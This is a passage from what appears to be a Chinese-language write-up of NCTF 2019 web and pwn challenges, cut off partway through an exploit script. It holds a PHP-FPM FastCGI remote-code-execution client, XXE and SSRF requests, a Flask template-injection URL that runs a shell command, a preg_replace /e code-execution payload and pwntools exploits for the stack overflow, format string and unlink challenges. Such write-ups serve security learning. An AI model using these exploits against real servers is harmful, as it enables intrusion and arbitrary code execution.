                    value = force_bytes(value)
                    paramsRecord += self.__encodeNameValueParams(name, value)
            if paramsRecord:
                request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
            if post:
                request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
            self.sock.send(request)
            self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
            self.requests[requestId]['response'] = b''
            return self.__waitForResponse(requestId)
        def __waitForResponse(self, requestId):
            data = b''
            while True:
                buf = self.sock.recv(512)
                if not len(buf):
                    break
                data += buf
            data = BytesIO(data)
            while True:
                response = self.__decodeFastCGIRecord(data)
                if not response:
                    break
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                        or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                        self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                    if requestId == int(response['requestId']):
                        self.requests[requestId]['response'] += response['content']
                if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                    self.requests[requestId]
            return self.requests[requestId]['response']
        def __repr__(self):
            return "fastcgi connect host:{} port:{}".format(self.host, self.port)
    if __name__ == '__main__':
        parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
        parser.add_argument('host', help='Target host, such as 127.0.0.1')
        parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
        parser.add_argument('-c', '--code', help='What php code your want to execute', default='')
        parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
        args = parser.parse_args()
        client = FastCGIClient(args.host, args.port, 3, 0)
        params = dict()
        documentRoot = "/"
        uri = args.file
        content = args.code
        params = {
            'GATEWAY_INTERFACE': 'FastCGI/1.0',
            'REQUEST_METHOD': 'POST',
            'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
            'SCRIPT_NAME': uri,
            'QUERY_STRING': '',
            'REQUEST_URI': uri,
            'DOCUMENT_ROOT': documentRoot,
            'SERVER_SOFTWARE': 'php/fcgiclient',
            'REMOTE_ADDR': '127.0.0.1',
            'REMOTE_PORT': '9985',
            'SERVER_ADDR': '127.0.0.1',
            'SERVER_PORT': '80',
            'SERVER_NAME': "localhost",
            'SERVER_PROTOCOL': 'HTTP/1.1',
            'CONTENT_TYPE': 'application/text',
            'CONTENT_LENGTH': "%d" % len(content),
            'PHP_VALUE': 'auto_prepend_file = php://input',
            'PHP_ADMIN_VALUE': 'safe_mode=Off\nopen_basedir=Off\ndisable_functions=Off\nallow_url_include = On'
        }
        response = client.request(params, content)
        print(force_text(response))
### Fake XML cookbook
F12看了一眼发现
    function doLogin(){
        var username = $("#username").val();
        var password = $("#password").val();
        if(username == "" || password == ""){
            alert("Please enter the username and password!");
            return;
        }
        var data = "" + username + "" + password + ""; 
        $.ajax({
            type: "POST",
            url: "doLogin.php",
            contentType: "application/xml;charset=utf-8",
            data: data,
            dataType: "xml",
            anysc: false,
            success: function (result) {
                var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
                var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
                if(code == "0"){
                    $(".msg").text(msg + " login fail!");
                }else if(code == "1"){
                    $(".msg").text(msg + " login success!");
                }else{
                    $(".msg").text("error:" + msg);
                }
            },
            error: function (XMLHttpRequest,textStatus,errorThrown) {
                $(".msg").text(errorThrown + ':' + textStatus);
            }
        }); 
    }
用XML和服务器通讯，联想到XXE攻击
burp抓post包得到
    POST /doLogin.php HTTP/1.1
    Host: nctf2019.x1ct34m.com:40002
    Content-Length: 207
    Accept: application/xml, text/xml, */*; q=0.01
    Origin: http://nctf2019.x1ct34m.com:40002
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
    DNT: 1
    Content-Type: application/xml;charset=UTF-8
    Referer: http://nctf2019.x1ct34m.com:40003/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Connection: close
    admin123
根据js脚本可以发现username是可以回显的
然后构造一下exp
    POST /doLogin.php HTTP/1.1
    Host: nctf2019.x1ct34m.com:40002
    Content-Length: 207
    Accept: application/xml, text/xml, */*; q=0.01
    Origin: http://nctf2019.x1ct34m.com:40002
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
    DNT: 1
    Content-Type: application/xml;charset=UTF-8
    Referer: http://nctf2019.x1ct34m.com:40003/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Connection: close
     ]>
    &xxe;123
### True XML cookbook
    POST /doLogin.php HTTP/1.1
    Host: nctf2019.x1ct34m.com:40003
    Content-Length: 211
    Accept: application/xml, text/xml, */*; q=0.01
    Origin: http://nctf2019.x1ct34m.com:40003
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
    DNT: 1
    Content-Type: application/xml;charset=UTF-8
    Referer: http://nctf2019.x1ct34m.com:40003/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Connection: close
     ]>
    &xxe;123
SSRF
    POST /doLogin.php HTTP/1.1
    Host: nctf2019.x1ct34m.com:40003
    Content-Length: 220
    Accept: application/xml, text/xml, */*; q=0.01
    Origin: http://nctf2019.x1ct34m.com:40003
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
    DNT: 1
    Content-Type: application/xml;charset=UTF-8
    Referer: http://nctf2019.x1ct34m.com:40003/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Connection: close
     ]>
    &xxe;123
NCTF{XXE-labs_is_g00d}
### flask
模板注入,用通配符读flag
    http://nctf2019.x1ct34m.com:40007/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat%20/fla?%27).read()%7D%7D
### Upload your Shell
传一个图片马,会返回一个题目本身就准备好的图片马的所在目录  
找个地方包含一下就好了
    http://nctf2019.x1ct34m.com:60002/index.php?action=/upload-imgs/9ae46c526dfb6d96e95ad35bfbb2b6c4/Th1s_is_a_fl4g.jpg
### replace
填三个"#"报错
    Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1
    Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70
实现功能使用的是preg_replace()
题目提示用了php5.6
想到preg_replace() /e参数
试一下可以执行phpinfo()
    POST /index.php HTTP/1.1
    Host: nctf2019.x1ct34m.com:40006
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 72
    Origin: http://nctf2019.x1ct34m.com:40006
    Connection: close
    Referer: http://nctf2019.x1ct34m.com:40006/index.php
    Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g
    Upgrade-Insecure-Requests: 1
    sub=text&pat=e&rep=phpinfo();
但是直接用readfile('/flag')读文件，发现单引号被拦截
于是用chr()拼接表示字符串。。。。。
    POST /index.php HTTP/1.1
    Host: nctf2019.x1ct34m.com:40006
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 72
    Origin: http://nctf2019.x1ct34m.com:40006
    Connection: close
    Referer: http://nctf2019.x1ct34m.com:40006/index.php
    Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g
    Upgrade-Insecure-Requests: 1
    sub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103));
## Pwn
### hello_pwn
连接nc后发现让我用pwntools  
构造exp  
获得flag
### pwn_me_1
基础栈溢出
    from pwn import *
    a=remote("139.129.76.65","50004")
    ad=0x400861
    payload='yes\0'+'a'*12+p64(0x66666666)
    a.sendline(payload)
    a.interactive()
### pwn_me_2
基础格式化字符串
    #coding:utf-8
    from pwn import *
    path = './pwn_me_2'
    local = 0
    attach = 0
    #P = ELF(path)
    context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
    context.log_level = 'debug'
    if local == 1:
        p = process(path)
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('139.129.76.65',50005)
    p.recvuntil('but your name:\n')
    p.send('%p'*15)
    p.recvuntil('preparing......\n')
    base = int(p.recv(14),16) - (0x55f5229a5080-0x000055f5227a3000)
    log.success('base = '+hex(base))
    target = base+0x2020e0
    p.recvuntil('what do you want?\n')
    payload = '%'+str(0x66)+'c%10$hhn'+'%'+str(0x666666-0x66)+'c%11$lln....'+p64(target)+p64(target+1) 
    p.send(payload)
    #NCTF{rrr_loves_pwn_and_100years}
    if attach == 1:
        gdb.attach(p)
    p.interactive()
### pwn_me_3
基础unlink
    #coding:utf-8
    from pwn import *
    path = './pwn_me_3'
    local = 1
    attach = 0
    #P = ELF(path)
    context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
    context.log_level = 'debug'
    if local == 0:
        p = process(path)
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('139.129.76.65',50006)
    def add(size,content):
        p.recvuntil('5,exit\n')
        p.sendline('1')
        p.recvuntil('size:\n')
        p.sendline(str(size))
        p.recvuntil('content:\n')
        p.send(content)
    def delete(index):
        p.recvuntil('5,exit\n')
        p.sendline('2')
        p.recvuntil('idx:\n')
        p.sendline(str(index))
    def show(index):
        p.recvuntil('5,exit\n')
        p.sendline('3')
        p.recvuntil('idx\n')